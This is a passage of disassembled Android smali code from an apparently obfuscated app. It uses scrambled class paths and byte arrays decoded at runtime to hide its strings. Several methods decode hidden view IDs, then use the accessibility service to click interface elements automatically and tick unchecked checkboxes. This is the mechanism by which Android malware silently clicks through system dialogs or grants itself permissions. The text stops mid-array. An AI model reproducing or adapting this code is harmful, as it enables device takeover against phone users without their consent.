    invoke-virtual {p0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p0

    const/4 v0, 0x0

    const/16 v1, 0x8

    if-eqz p0, :cond_2

    const/4 p0, 0x5

    new-array p0, p0, [B

    fill-array-data p0, :array_0

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    :goto_0
    invoke-static {p0, v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->q(Ljava/lang/String;[Ljava/lang/String;)V

    goto :goto_2

    :catch_0
    move-exception p0

    goto :goto_1

    :cond_2
    const/4 p0, 0x7

    new-array p0, p0, [B

    fill-array-data p0, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :goto_1
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_2
    return-void

    :array_0
    .array-data 1
        0x72t
        0x57t
        -0x6t
        0x7at
        -0x7ft
    .end array-data

    nop

    :array_1
    .array-data 1
        0x10t
        0x3bt
        -0x65t
        0x19t
        -0x16t
        -0x30t
        -0x1et
        -0x5bt
    .end array-data

    :array_2
    .array-data 1
        0x1dt
        0x55t
        -0x38t
        0x6ft
        0x7bt
        0x1dt
        0x2bt
    .end array-data

    :array_3
    .array-data 1
        0x73t
        0x3at
        -0x56t
        0x3t
        0x1at
        0x7et
        0x40t
        -0x79t
    .end array-data
.end method

.method public static e(Ljava/lang/Boolean;)V
    .locals 2

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_1

    return-void

    :cond_1
    :try_start_0
    invoke-virtual {p0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p0

    const/4 v0, 0x0

    const/16 v1, 0x8

    if-eqz p0, :cond_2

    const/4 p0, 0x6

    new-array p0, p0, [B

    fill-array-data p0, :array_0

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    :goto_0
    invoke-static {p0, v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->q(Ljava/lang/String;[Ljava/lang/String;)V

    goto :goto_2

    :catch_0
    move-exception p0

    goto :goto_1

    :cond_2
    new-array p0, v1, [B

    fill-array-data p0, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :goto_1
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        -0x45t
        0x3at
        -0x59t
        -0x47t
        -0x48t
        0x66t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x27t
        0x5bt
        -0x2ct
        -0x36t
        -0x2ft
        0x12t
        -0x73t
        -0x58t
    .end array-data

    :array_2
    .array-data 1
        0x54t
        -0x2ft
        -0x54t
        0x2et
        0x9t
        -0x6ct
        0x1t
        0x47t
    .end array-data

    :array_3
    .array-data 1
        0x3at
        -0x42t
        -0x32t
        0x4ft
        0x7at
        -0x19t
        0x68t
        0x33t
    .end array-data
.end method

.method public static f(Landroid/content/Context;)V
    .locals 4

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-eqz v0, :cond_0

    const/4 p0, 0x7

    new-array p0, p0, [B

    fill-array-data p0, :array_0

    const/16 v0, 0x8

    new-array v0, v0, [B

    fill-array-data v0, :array_1

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    const/4 v0, 0x0

    invoke-static {p0, v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->q(Ljava/lang/String;[Ljava/lang/String;)V

    goto :goto_0

    :cond_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$a;

    invoke-direct {v1, p0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$a;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :goto_0
    return-void

    :array_0
    .array-data 1
        -0x66t
        0x64t
        0x60t
        -0x2at
        -0xct
        -0x14t
        0x74t
    .end array-data

    :array_1
    .array-data 1
        -0x12t
        0xbt
        0x6t
        -0x5ct
        -0x65t
        -0x7et
        0x0t
        -0x32t
    .end array-data
.end method

.method public static g(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 9

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_1

    return-void

    :cond_1
    if-nez p0, :cond_2

    return-void

    :cond_2
    const/16 v1, 0x12

    :try_start_0
    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    const/4 v3, 0x0

    invoke-interface {v1, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/4 v4, 0x3

    new-array v5, v4, [Ljava/lang/String;

    const/16 v6, 0x29

    new-array v6, v6, [B

    fill-array-data v6, :array_2

    new-array v7, v2, [B

    fill-array-data v7, :array_3

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v5, v3

    const/16 v6, 0x28

    new-array v6, v6, [B

    fill-array-data v6, :array_4

    new-array v7, v2, [B

    fill-array-data v7, :array_5

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x1

    aput-object v6, v5, v7

    const/16 v6, 0x43

    new-array v6, v6, [B

    fill-array-data v6, :array_6

    new-array v2, v2, [B

    fill-array-data v2, :array_7

    invoke-static {v6, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v6, 0x2

    aput-object v2, v5, v6

    :goto_0
    const/16 v2, 0x10

    if-ge v3, v4, :cond_4

    aget-object v6, v5, v3

    invoke-virtual {p0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :goto_1
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_3

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v7, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const-wide/16 v7, 0xc8

    invoke-static {v7, v8}, Ljava/lang/Thread;->sleep(J)V

    goto :goto_1

    :cond_3
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_4
    if-eqz v1, :cond_5

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_5
    new-instance p0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {p0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$g;

    invoke-direct {v1, v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$g;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0x7d0

    invoke-virtual {p0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void

    :array_0
    .array-data 1
        -0x76t
        -0x42t
        -0xbt
        0x53t
        0x7ft
        -0x3t
        0x67t
        -0xat
        -0x7et
        -0x4ct
        -0x42t
        0x43t
        0x65t
        -0x20t
        0x77t
        -0x5dt
        -0x7bt
        -0x1ft
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x15t
        -0x30t
        -0x6ft
        0x21t
        0x10t
        -0x6ct
        0x3t
        -0x34t
    .end array-data

    :array_2
    .array-data 1
        0xbt
        -0x1bt
        -0xbt
        0x11t
        -0x79t
        -0x14t
        0x2et
        -0xet
        0x6t
        -0x1bt
        -0x16t
        0x11t
        -0x64t
        -0x4t
        0x35t
        -0x17t
        0xdt
        -0x19t
        -0xbt
        0x5et
        -0x7ft
        -0x1ct
        0x21t
        -0x8t
        0x1at
        -0x50t
        -0xft
        0x5bt
        -0x40t
        -0x1at
        0x24t
        -0x3et
        0x1at
        -0x11t
        -0xbt
        0x56t
        -0x7ft
        -0x1ft
        0x23t
        -0x11t
        0x1bt
    .end array-data

    nop

    :array_3
    .array-data 1
        0x68t
        -0x76t
        -0x68t
        0x3ft
        -0x11t
        -0x7bt
        0x46t
        -0x63t
    .end array-data

    :array_4
    .array-data 1
        -0x10t
        -0x59t
        -0x5et
        0x31t
        0x6dt
        0x46t
        -0x38t
        0x3ct
        -0xat
        -0x5ft
        -0x1ft
        0x6ct
        0x7ct
        0x40t
        -0x23t
        0x2et
        -0x2t
        -0x5bt
        -0x52t
        0x71t
        0x64t
        0x54t
        -0x34t
        0x39t
        -0x57t
        -0x5ft
        -0x55t
        0x30t
        0x66t
        0x51t
        -0xat
        0x39t
        -0xat
        -0x5bt
        -0x5at
        0x71t
        0x61t
        0x56t
        -0x25t
        0x38t
    .end array-data

    :array_5
    .array-data 1
        -0x6dt
        -0x38t
        -0x31t
        0x1ft
        0x5t
        0x33t
        -0x57t
        0x4bt
    .end array-data

    :array_6
    .array-data 1
        -0x73t
        -0xat
        -0x54t
        -0x21t
        -0x75t
        -0x62t
        0x30t
        0x23t
        -0x63t
        -0x49t
        -0x4et
        -0x6ct
        -0x79t
        -0x65t
        0x2et
        0x3ft
        -0x66t
        -0x20t
        -0x4ft
        -0x6ct
        -0x6at
        -0x7dt
        0x35t
        0x25t
        -0x63t
        -0x10t
        -0x52t
        -0x61t
        -0x22t
        -0x79t
        0x38t
        0x79t
        -0x73t
        -0xat
        -0x4ct
        -0x68t
        -0x45t
        -0x63t
        0x39t
        0x35t
        -0x65t
        -0x15t
        -0x58t
        -0x7bt
        -0x63t
        -0x4ft
        0x3dt
        0x3at
        -0x75t
        -0x15t
        -0x4bt
        -0x52t
        -0x80t
        -0x79t
        0x3dt
        0x3at
        -0x7ft
        -0x2t
        -0x62t
        -0x6et
        -0x74t
        -0x75t
        0x3ft
        0x3dt
        -0x74t
        -0xat
        -0x47t
    .end array-data

    :array_7
    .array-data 1
        -0x12t
        -0x67t
        -0x3ft
        -0xft
        -0x1ct
        -0x12t
        0x5ct
        0x56t
    .end array-data
.end method

.method public static h(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 13

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_1

    return-void

    :cond_1
    if-nez p0, :cond_2

    return-void

    :cond_2
    const/16 v0, 0x10

    :try_start_0
    new-array v1, v0, [Ljava/lang/String;

    const/16 v2, 0x2f

    new-array v3, v2, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v5, 0x0

    aput-object v3, v1, v5

    const/16 v3, 0x37

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v6, v4, [B

    fill-array-data v6, :array_3

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v6, 0x1

    aput-object v3, v1, v6

    const/16 v3, 0x3e

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    new-array v7, v4, [B

    fill-array-data v7, :array_5

    invoke-static {v3, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v7, 0x2

    aput-object v3, v1, v7

    const/16 v3, 0x47

    new-array v3, v3, [B

    fill-array-data v3, :array_6

    new-array v8, v4, [B

    fill-array-data v8, :array_7

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v8, 0x3

    aput-object v3, v1, v8

    const/16 v3, 0x4b

    new-array v3, v3, [B

    fill-array-data v3, :array_8

    new-array v9, v4, [B

    fill-array-data v9, :array_9

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v9, 0x4

    aput-object v3, v1, v9

    const/16 v3, 0x25

    new-array v3, v3, [B

    fill-array-data v3, :array_a

    new-array v9, v4, [B

    fill-array-data v9, :array_b

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v9, 0x5

    aput-object v3, v1, v9

    const/16 v3, 0x24

    new-array v9, v3, [B

    fill-array-data v9, :array_c

    new-array v10, v4, [B

    fill-array-data v10, :array_d

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    const/4 v10, 0x6

    aput-object v9, v1, v10

    const/16 v9, 0x40

    new-array v9, v9, [B

    fill-array-data v9, :array_e

    new-array v10, v4, [B

    fill-array-data v10, :array_f

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    const/4 v10, 0x7

    aput-object v9, v1, v10

    const/16 v9, 0x14

    new-array v10, v9, [B

    fill-array-data v10, :array_10

    new-array v11, v4, [B

    fill-array-data v11, :array_11

    invoke-static {v10, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    aput-object v10, v1, v4

    const/16 v10, 0x12

    new-array v10, v10, [B

    fill-array-data v10, :array_12

    new-array v11, v4, [B

    fill-array-data v11, :array_13

    invoke-static {v10, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    const/16 v11, 0x9

    aput-object v10, v1, v11

    new-array v2, v2, [B

    fill-array-data v2, :array_14

    new-array v10, v4, [B

    fill-array-data v10, :array_15

    invoke-static {v2, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/16 v10, 0xa

    aput-object v2, v1, v10

    const/16 v2, 0x3b

    new-array v2, v2, [B

    fill-array-data v2, :array_16

    new-array v10, v4, [B

    fill-array-data v10, :array_17

    invoke-static {v2, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/16 v10, 0xb

    aput-object v2, v1, v10

    const/16 v2, 0xd

    new-array v10, v2, [B

    fill-array-data v10, :array_18

    new-array v11, v4, [B

    fill-array-data v11, :array_19

    invoke-static {v10, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    const/16 v11, 0xc

    aput-object v10, v1, v11

    const/16 v10, 0xf

    new-array v11, v10, [B

    fill-array-data v11, :array_1a

    new-array v12, v4, [B

    fill-array-data v12, :array_1b

    invoke-static {v11, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    aput-object v11, v1, v2

    const/16 v2, 0x17

    new-array v2, v2, [B

    fill-array-data v2, :array_1c

    new-array v11, v4, [B

    fill-array-data v11, :array_1d

    invoke-static {v2, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/16 v11, 0xe

    aput-object v2, v1, v11

    new-array v2, v9, [B

    fill-array-data v2, :array_1e

    new-array v9, v4, [B

    fill-array-data v9, :array_1f

    invoke-static {v2, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v1, v10

    move v2, v5

    :goto_0
    if-ge v2, v0, :cond_4

    aget-object v9, v1, v2

    invoke-virtual {p0, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v9

    invoke-interface {v9}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :goto_1
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z

    move-result v10

    if-eqz v10, :cond_3

    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v10, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_1

    :cond_3
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_4
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    if-ne v1, v7, :cond_b

    new-array v1, v6, [Ljava/lang/String;

    new-array v2, v3, [B

    fill-array-data v2, :array_20

    new-array v3, v4, [B

    fill-array-data v3, :array_21

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v1, v5

    move v2, v5

    :goto_2
    if-ge v2, v6, :cond_9

    aget-object v3, v1, v2

    invoke-virtual {p0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_5
    :goto_3
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v9

    if-eqz v9, :cond_8

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v10

    if-lez v10, :cond_6

    new-instance v10, Ljava/util/ArrayList;

    invoke-direct {v10}, Ljava/util/ArrayList;-><init>()V

    goto :goto_4

    :cond_6
    const/4 v10, 0x0

    :goto_4
    if-eqz v10, :cond_5

    move v11, v5

    :goto_5
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v12

    if-ge v11, v12, :cond_7

    invoke-virtual {v9, v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v12

    invoke-interface {v10, v12}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    add-int/lit8 v11, v11, 0x1

    goto :goto_5

    :cond_7
    invoke-interface {v10}, Ljava/util/List;->isEmpty()Z

    move-result v9

    if-nez v9, :cond_5

    invoke-interface {v10}, Ljava/util/List;->size()I

    move-result v9

    sub-int/2addr v9, v6

    invoke-interface {v10, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v9, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_3

    :cond_8
    add-int/lit8 v2, v2, 0x1

    goto :goto_2

    :cond_9
    new-array p0, v0, [B

    fill-array-data p0, :array_22

    new-array v1, v4, [B

    fill-array-data v1, :array_23

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    if-eqz p0, :cond_b

    invoke-interface {p0}, Ljava/util/List;->size()I

    move-result v1

    if-le v1, v6, :cond_b

    invoke-interface {p0, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz p0, :cond_b

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_b

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-le v1, v7, :cond_a

    invoke-virtual {p0, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    if-lez v2, :cond_b

    invoke-virtual {v1, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_b

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v2

    if-eqz v2, :cond_b

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v1

    if-nez v1, :cond_b

    :goto_6
    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_7

    :cond_a
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_b

    invoke-virtual {p0, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_b

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v2

    if-eqz v2, :cond_b

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v1, :cond_b

    goto :goto_6

    :catch_0
    :cond_b
    :goto_7
    return-void

    :array_0
    .array-data 1
        0x50t
        -0x24t
        0x11t
        0x17t
        0x59t
        0x21t
        -0x73t
        -0x3ft
        0x62t
        -0x30t
        0x17t
        0x1et
        0x59t
        0x30t
        -0x7et
        -0x3at
        0x7bt
        -0x22t
        0x19t
        0x1ft
        0x1et
        0x2et
        -0x70t
        -0x2ft
        0x71t
        -0x2dt
        0x12t
        0x1ft
        0x5t
        0x7at
        -0x76t
        -0x3ft
        0x3ft
        -0x24t
        0x11t
        0x14t
        0x11t
        0x29t
        -0x6ft
        -0x38t
        0x4ft
        -0x23t
        0xbt
        0xet
        0x3t
        0x2ft
        -0x73t
    .end array-data

    :array_1
    .array-data 1
        0x10t
        -0x41t
        0x7et
        0x7at
        0x77t
        0x40t
        -0x1dt
        -0x5bt
    .end array-data

    :array_2
    .array-data 1
        -0x63t
        0x73t
        -0x69t
        -0x58t
        0x68t
        0x7et
        -0x47t
        -0x17t
        -0x6ft
        0x75t
        -0x62t
        -0x58t
        0x79t
        0x71t
        -0x42t
        -0x10t
        -0x61t
        0x7bt
        -0x61t
        -0x11t
        0x67t
        0x63t
        -0x57t
        -0x6t
        -0x6et
        0x70t
        -0x61t
        -0xct
        0x33t
        0x79t
        -0x47t
        -0x4ct
        -0x72t
        0x79t
        -0x78t
        -0x15t
        0x60t
        0x63t
        -0x52t
        -0xet
        -0x6ft
        0x72t
        -0x5bt
        -0x19t
        0x65t
        0x7ct
        -0x4et
